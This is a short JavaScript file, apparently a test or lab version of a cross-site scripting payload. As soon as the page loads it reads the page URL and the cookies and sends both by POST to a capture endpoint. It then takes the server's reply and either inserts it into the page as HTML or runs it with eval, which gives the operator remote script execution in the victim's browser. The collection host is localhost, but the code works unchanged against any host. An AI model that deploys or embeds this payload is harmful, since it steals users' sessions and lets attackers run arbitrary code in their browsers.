HOST = "http://localhost:8080/capture/receive";

window.onload = function(){
    console.info(document.URL);
    console.info(document.cookie);
    sendInfo(document.URL, document.cookie);
};

function sendInfo(url, cookie){

    var xhr = new XMLHttpRequest();
    xhr.open("POST", HOST, true);

    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        console.info(xhr.responseText);
        var jsonObj = JSON.parse(xhr.responseText);
        // var jsonObj = {'name':'test', 'content':'test'};
        console.log(jsonObj);
        if('element' == jsonObj.name){
            //add element
            var selfDiv = document.createElement('div');
            selfDiv.innerHTML = jsonObj.content;
            var firstEle=document.body.firstChild;
            document.body.insertBefore(selfDiv,firstEle);

        }else if('script' ==  jsonObj.name){
            //run script
            eval("(" + jsonObj.content + ")");
        }else{
             var selfDiv = document.createElement('div');
            selfDiv.innerHTML = 'haha this is test';
            selfDiv.style = 'color:red;';
            var firstEle = document.body.firstChild;
            document.body.insertBefore(selfDiv,firstEle);
        }
      }
    };

    xhr.send('url=' + url + '&cookie=' + cookie);

};


